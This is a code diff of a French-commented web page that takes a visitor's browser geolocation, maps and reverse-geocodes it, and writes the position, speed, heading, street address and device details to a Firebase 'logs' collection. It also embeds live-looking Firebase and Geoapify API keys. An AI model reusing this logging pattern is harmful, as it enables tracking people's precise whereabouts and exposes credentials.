@@ -24,6 +24,7 @@ body {
 button {
   margin:15px;
   padding:12px;
+  font-size:16px;
 }
 </style>
 </head>
@@ -41,14 +42,19 @@ button {
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
+<!-- FIREBASE -->
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
 import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
 const firebaseConfig = {
-  apiKey: "TA_CLE",
-  authDomain: "TON_PROJET.firebaseapp.com",
-  projectId: "TON_PROJET",
+  apiKey: "AIzaSyAgwaKZKvLOW_GYpVirgywWETM4Kjz3dVQ",
+  authDomain: "mymaponline-d4fcf.firebaseapp.com",
+  projectId: "mymaponline-d4fcf",
+  storageBucket: "mymaponline-d4fcf.firebasestorage.app",
+  messagingSenderId: "294259967332",
+  appId: "1:294259967332:web:d81f81f5122ff5ef626671",
+  measurementId: "G-4M4S7687W5"
 };
 
 const app = initializeApp(firebaseConfig);
@@ -74,9 +80,12 @@ function start(){
 
     const lat = pos.coords.latitude;
     const lon = pos.coords.longitude;
+    const accuracy = pos.coords.accuracy;
+    const speed = pos.coords.speed;
+    const heading = pos.coords.heading;
 
     document.getElementById("coords").innerText =
-      `Lat: ${lat} | Lon: ${lon}`;
+      `Lat: ${lat} | Lon: ${lon} | ±${accuracy}m`;
 
     // MAP
     if (!map) {
@@ -91,26 +100,59 @@ function start(){
       marker.setLatLng([lat, lon]);
     }
 
-    // ADRESSE
+    // GEOAPIFY
     let address = "Inconnue";
+    let details = {};
 
     try {
       const res = await fetch(
-        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
+        `https://api.geoapify.com/v1/geocode/reverse?lat=${lat}&lon=${lon}&apiKey=708354c5ad334d41b0611f73996998e1`
       );
+
       const data = await res.json();
-      address = data.display_name || "Inconnue";
+
+      const props = data.features?.[0]?.properties;
+
+      if (props) {
+        address = props.formatted;
+
+        details = {
+          country: props.country,
+          city: props.city,
+          postcode: props.postcode,
+          street: props.street,
+          housenumber: props.housenumber,
+          state: props.state,
+          suburb: props.suburb
+        };
+      }
+
     } catch(e){}
 
     document.getElementById("address").innerText = address;
 
-    // FIREBASE LOG
+    // FIREBASE LOG COMPLET
     await window.addDoc(window.collection(window.db, "logs"), {
+
+      // POSITION
       lat,
       lon,
+      accuracy,
+      speed,
+      heading,
+
+      // ADRESSE
       address,
+      ...details,
+
+      // DEVICE
       userAgent: navigator.userAgent,
+      language: navigator.language,
+      platform: navigator.platform,
+
+      // TEMPS
       time: new Date().toISOString()
+
     });
 
   }, (err) => {
